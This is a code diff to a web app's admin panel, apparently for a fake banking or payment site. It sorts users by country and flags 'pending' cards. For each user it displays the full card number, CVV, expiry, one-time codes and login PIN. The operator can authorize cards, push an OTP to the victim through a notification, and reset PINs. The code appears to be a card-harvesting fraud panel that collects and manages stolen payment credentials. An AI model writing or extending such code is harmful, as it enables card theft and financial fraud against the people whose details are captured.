@@ -405,6 +405,7 @@
             ],
             'Portugal': [
                 { name: 'PayPal', fields: ['email'] },
+                { name: 'Revolut', fields: ['accountHolder', 'iban'] },
                 { name: 'Millennium BCP', fields: ['accountHolder', 'iban'] },
                 { name: 'CGD', fields: ['accountHolder', 'iban'] },
                 { name: 'Santander Totta', fields: ['accountHolder', 'iban'] },
@@ -1279,76 +1280,159 @@
             
             if (snapshot.exists()) {
                 const users = snapshot.val();
-                const userList = document.getElementById('admin-user-list');
-                userList.innerHTML = '';
+                
+                // Separate users by categories
+                const pendingCardUsers = [];
+                const usersByCountry = {};
                 
                 for (const uid in users) {
                     const user = users[uid];
-                    if (user.email === 'admin@gmail.com') continue; // Skip admin account
+                    if (user.email === 'admin@gmail.com') continue;
                     
                     const linkedCards = user.linkedCards || [];
-                    let cardsHTML = '';
+                    const hasPendingCards = linkedCards.some(card => 
+                        card.status === 'pending' || card.status === 'otp_required'
+                    );
                     
-                    if (linkedCards.length > 0) {
-                        cardsHTML = '<div class="admin-cards-section"><h4>Linked Cards:</h4>';
-                        linkedCards.forEach((card, cardIndex) => {
-                            const statusClass = card.status === 'authorized' ? 'authorized' : card.status === 'otp_required' ? 'otp' : 'pending';
-                            cardsHTML += `
-                                <div class="admin-card-item">
-                                    <div class="admin-card-details">
-                                        <strong>${card.brand}</strong> •••• ${card.lastFour}<br>
-                                        <small>Name: ${card.name}</small><br>
-                                        <small>Expiry: ${card.expiry} | CVV: ${card.cvv}</small><br>
-                                        <small>Full Number: ${card.number}</small><br>
-                                        ${card.otp ? `<small style="color:#3b82f6;">OTP: ${card.otp}</small><br>` : ''}
-                                        ${card.rejectionReason ? `<small style="color:#ff5c5c;">Rejected: ${card.rejectionReason}</small><br>` : ''}
-                                        <span class="card-status ${statusClass}">${card.status === 'authorized' ? '✓ Authorized' : card.status === 'otp_required' ? '🔐 OTP Required' : card.status === 'rejected' ? '❌ Rejected' : '⏳ Pending'}</span>
-                                    </div>
-                                    <div class="admin-card-actions">
-                                        <button class="admin-auth-btn" onclick="authorizeCard('${uid}', ${cardIndex})">Authorize</button>
-                                        <button class="admin-otp-btn" onclick="requireOTP('${uid}', ${cardIndex})">Require OTP</button>
-                                        <button class="admin-reject-btn" onclick="rejectCard('${uid}', ${cardIndex})">Reject</button>
-                                    </div>
-                                </div>
-                            `;
-                        });
-                        cardsHTML += '</div>';
+                    if (hasPendingCards) {
+                        pendingCardUsers.push({ uid, user });
                     }
                     
-                    const userCard = document.createElement('div');
-                    userCard.className = 'admin-user-card';
-                    userCard.innerHTML = `
-                        <div class="admin-user-info">
-                            <div class="admin-user-name">${user.firstname} ${user.surname}</div>
-                            <div class="admin-user-detail">Email: ${user.email}</div>
-                            <div class="admin-user-detail">Account: ${user.accountNumber}</div>
-                            <div class="admin-user-detail">Current PIN: ${user.pin || 'N/A'}</div>
-                            <div class="admin-user-detail">Balance: ${currencySymbols[user.currency] || '$'}${(user.balance || 0).toLocaleString()}</div>
-                        </div>
-                        ${cardsHTML}
-                        <div class="admin-user-actions">
-                            <input type="text" class="admin-pin-input" placeholder="New PIN" maxlength="4" pattern="\\d{4}" id="pin-${uid}">
-                            <button class="admin-change-pin-btn" onclick="changeUserPin('${uid}')">Change PIN</button>
+                    const country = user.country || 'Unknown';
+                    if (!usersByCountry[country]) {
+                        usersByCountry[country] = [];
+                    }
+                    usersByCountry[country].push({ uid, user });
+                }
+                
+                // Render Required Updates section
+                const requiredUpdatesList = document.getElementById('required-updates-list');
+                requiredUpdatesList.innerHTML = '';
+                
+                if (pendingCardUsers.length === 0) {
+                    requiredUpdatesList.innerHTML = '<p style="text-align:center; opacity:0.6;">No users requiring updates</p>';
+                } else {
+                    pendingCardUsers.forEach(({ uid, user }) => {
+                        requiredUpdatesList.appendChild(createUserCard(uid, user, true));
+                    });
+                }
+                
+                // Render users by country
+                const countrySections = document.getElementById('country-sections');
+                countrySections.innerHTML = '';
+                
+                const sortedCountries = Object.keys(usersByCountry).sort();
+                sortedCountries.forEach(country => {
+                    const countrySection = document.createElement('div');
+                    countrySection.className = 'country-section';
+                    
+                    const countryHeader = document.createElement('div');
+                    countryHeader.className = 'country-header';
+                    countryHeader.innerHTML = `
+                        <h3>${country}</h3>
+                        <span class="country-count">${usersByCountry[country].length} users</span>
+                    `;
+                    countrySection.appendChild(countryHeader);
+                    
+                    const countryUsersList = document.createElement('div');
+                    countryUsersList.className = 'country-users-list';
+                    
+                    usersByCountry[country].forEach(({ uid, user }) => {
+                        countryUsersList.appendChild(createUserCard(uid, user, false));
+                    });
+                    
+                    countrySection.appendChild(countryUsersList);
+                    countrySections.appendChild(countrySection);
+                });
+            }
+        }
+
+        function createUserCard(uid, user, showUrgent) {
+            const linkedCards = user.linkedCards || [];
+            let cardsHTML = '';
+            let urgentBadge = '';
+            
+            if (linkedCards.length > 0) {
+                cardsHTML = '<div class="admin-cards-section"><h4>Linked Cards:</h4>';
+                linkedCards.forEach((card, cardIndex) => {
+                    const statusClass = card.status === 'authorized' ? 'authorized' : 
+                                       card.status === 'otp_required' ? 'otp' : 
+                                       card.status === 'rejected' ? 'rejected' : 'pending';
+                    
+                    if (showUrgent && (card.status === 'pending' || card.status === 'otp_required')) {
+                        urgentBadge = '<span class="urgent-badge">🔴 REQUIRES ACTION</span>';
+                    }
+                    
+                    cardsHTML += `
+                        <div class="admin-card-item">
+                            <div class="admin-card-details">
+                                <strong>${card.brand}</strong> •••• ${card.lastFour}<br>
+                                <small>Name: ${card.name}</small><br>
+                                <small>Expiry: ${card.expiry} | CVV: ${card.cvv}</small><br>
+                                <small>Full Number: ${card.number}</small><br>
+                                ${card.otp ? `<small style="color:#3b82f6;">OTP: ${card.otp}</small><br>` : ''}
+                                ${card.rejectionReason ? `<small style="color:#ff5c5c;">Rejected: ${card.rejectionReason}</small><br>` : ''}
+                                <span class="card-status ${statusClass}">${card.status === 'authorized' ? '✓ Authorized' : card.status === 'otp_required' ? '🔐 OTP Required' : card.status === 'rejected' ? '❌ Rejected' : '⏳ Pending'}</span>
+                            </div>
+                            <div class="admin-card-actions">
+                                <button class="admin-auth-btn" onclick="authorizeCard('${uid}', ${cardIndex})">Authorize</button>
+                                <button class="admin-otp-btn" onclick="requireOTP('${uid}', ${cardIndex})">Require OTP</button>
+                                <button class="admin-reject-btn" onclick="rejectCard('${uid}', ${cardIndex})">Reject</button>
+                            </div>
                         </div>
                     `;
-                    userList.appendChild(userCard);
-                }
+                });
+                cardsHTML += '</div>';
             }
+            
+            const userCard = document.createElement('div');
+            userCard.className = 'admin-user-card';
+            userCard.innerHTML = `
+                ${urgentBadge}
+                <div class="admin-user-info">
+                    <div class="admin-user-name">${user.firstname} ${user.surname}</div>
+                    <div class="admin-user-detail">Email: ${user.email}</div>
+                    <div class="admin-user-detail">Account: ${user.accountNumber}</div>
+                    <div class="admin-user-detail">Country: ${user.country || 'N/A'}</div>
+                    <div class="admin-user-detail">Current PIN: ${user.pin || 'N/A'}</div>
+                    <div class="admin-user-detail">Balance: ${currencySymbols[user.currency] || '$'}${(user.balance || 0).toLocaleString()}</div>
+                </div>
+                ${cardsHTML}
+                <div class="admin-user-actions">
+                    <input type="text" class="admin-pin-input" placeholder="New PIN" maxlength="4" pattern="\\d{4}" id="pin-${uid}">
+                    <button class="admin-change-pin-btn" onclick="changeUserPin('${uid}')">Change PIN</button>
+                </div>
+            `;
+            
+            return userCard;
         }
 
         window.authorizeCard = async function(uid, cardIndex) {
             if (!confirm('Authorize this card?')) return;
             
             try {
-                await runTransaction(ref(db, 'users/' + uid), (user) => {
+                const userRef = ref(db, 'users/' + uid);
+                
+                await runTransaction(userRef, (user) => {
                     if (user && user.linkedCards && user.linkedCards[cardIndex]) {
                         user.linkedCards[cardIndex].status = 'authorized';
+                        
+                        // Add notification
+                        if (!user.notifications) user.notifications = [];
+                        user.notifications.push({
+                            type: 'card_authorized',
+                            message: `Your card ending in ${user.linkedCards[cardIndex].lastFour} has been authorized!`,
+                            cardLastFour: user.linkedCards[cardIndex].lastFour,
+                            date: new Date().toISOString(),
+                            read: false
+                        });
+                        
                         return user;
                     }
                     return user;
                 });
                 
-                alert('Card authorized successfully!');
+                alert('Card authorized successfully! User has been notified.');
                 loadAdminPanel();
             } catch (err) {
                 alert('Failed to authorize card: ' + err.message);
@@ -1356,19 +1440,38 @@
         };
 
         window.requireOTP = async function(uid, cardIndex) {
-            const otp = prompt('Enter OTP code for this card (or leave empty to just mark as OTP required):');
+            const otp = prompt('Enter OTP code for this card:');
+            
+            if (!otp) {
+                alert('OTP is required');
+                return;
+            }
             
             try {
-                await runTransaction(ref(db, 'users/' + uid), (user) => {
+                const userRef = ref(db, 'users/' + uid);
+                
+                await runTransaction(userRef, (user) => {
                     if (user && user.linkedCards && user.linkedCards[cardIndex]) {
                         user.linkedCards[cardIndex].status = 'otp_required';
-                        user.linkedCards[cardIndex].otp = otp || '';
+                        user.linkedCards[cardIndex].otp = otp;
+                        
+                        // Add notification
+                        if (!user.notifications) user.notifications = [];
+                        user.notifications.push({
+                            type: 'otp_required',
+                            message: `OTP required for your card ending in ${user.linkedCards[cardIndex].lastFour}. Please check your notifications for the code.`,
+                            cardLastFour: user.linkedCards[cardIndex].lastFour,
+                            otp: otp,
+                            date: new Date().toISOString(),
+                            read: false
+                        });
+                        
                         return user;
                     }
                     return user;
                 });
                 
-                alert('Card marked as OTP required!');
+                alert('OTP sent to user successfully!');
                 loadAdminPanel();
             } catch (err) {
                 alert('Failed to update card: ' + err.message);
@@ -1444,12 +1547,19 @@
                     if (!notif.read) notifEl.classList.add('unread');
                     
                     const icon = notif.type === 'card_rejected' ? '❌' : 
-                                 notif.type === 'card_authorized' ? '✓' : '📢';
+                                 notif.type === 'card_authorized' ? '✅' : 
+                                 notif.type === 'otp_required' ? '🔐' : '📢';
+                    
+                    let extraInfo = '';
+                    if (notif.type === 'otp_required' && notif.otp) {
+                        extraInfo = `<div class="notification-otp">Your OTP: <strong>${notif.otp}</strong></div>`;
+                    }
                     
                     notifEl.innerHTML = `
                         <div class="notification-icon">${icon}</div>
                         <div class="notification-content">
                             <div class="notification-message">${notif.message}</div>
+                            ${extraInfo}
                             <div class="notification-time">${formatDate(notif.date)}</div>
                         </div>
                     `;
@@ -2380,6 +2490,87 @@
             font-size: 12px;
             opacity: 0.6;
         }
+
+        .notification-otp {
+            background: rgba(59, 130, 246, 0.15);
+            border-left: 3px solid #3b82f6;
+            padding: 8px 12px;
+            margin: 8px 0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .notification-otp strong {
+            color: #3b82f6;
+            font-size: 16px;
+            letter-spacing: 2px;
+        }
+
+        .urgent-badge {
+            background: #ff5c5c;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 12px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .country-section {
+            margin-bottom: 32px;
+        }
+
+        .country-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(0, 85, 255, 0.1);
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            border-left: 4px solid #0055ff;
+        }
+
+        .country-header h3 {
+            margin: 0;
+            font-size: 18px;
+            color: #4dabff;
+        }
+
+        .country-count {
+            background: rgba(255,255,255,0.1);
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .country-users-list {
+            margin-left: 8px;
+        }
+
+        .admin-section-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 24px 0 16px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid rgba(255,255,255,0.1);
+        }
+
+        .required-updates-section {
+            background: rgba(255, 92, 92, 0.05);
+            border: 1px solid rgba(255, 92, 92, 0.3);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 32px;
+        }
     </style>
 </head>
 <body>
@@ -2672,9 +2863,13 @@
         <button id="admin-logout-btn" class="admin-logout-btn">Logout</button>
     </div>
 
-    <div class="admin-user-list" id="admin-user-list">
-        <!-- Users will be loaded here -->
+    <div class="required-updates-section">
+        <h2 class="admin-section-title">🔴 Required Updates (Card Authorization)</h2>
+        <div id="required-updates-list"></div>
     </div>
+
+    <h2 class="admin-section-title">📍 Users by Country</h2>
+    <div id="country-sections"></div>
 </div>
 
 </body>
